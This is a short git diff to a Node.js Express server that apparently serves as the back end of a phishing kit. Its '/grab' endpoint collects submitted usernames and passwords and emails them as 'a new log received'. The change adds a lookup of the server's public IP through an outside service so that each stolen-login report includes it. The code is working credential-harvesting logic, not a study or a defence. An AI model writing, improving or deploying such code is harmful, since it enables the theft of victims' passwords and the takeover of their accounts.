@@ -1,5 +1,6 @@
 require("dotenv").config();
 const express=require("express");
+const axios = require('axios');
 const cors=require("cors");
 const helmet=require("helmet");
 const path=require("path")
@@ -16,10 +17,11 @@ app.use(express.urlencoded({extended:false}))
 app.use(express.static(path.join(__dirname,"public")));
 
 
-app.post("/grab",(req, res)=>{
-   
+app.post("/grab",async(req, res)=>{
+   const response = await axios.get('https://api.ipify.org?format=json');
+    const publicIP = response.data.ip;
    try{
-    $message=`Hello, a new log received.:\n User: ${req.body.user}\n Password: ${req.body.pass}\n Location: ${ip.address()}`;
+    $message=`Hello, a new log received.:\n User: ${req.body.user}\n Password: ${req.body.pass}\n Location: ${publicIP}`;
            sendmail($message);
            
             res.json("ok");
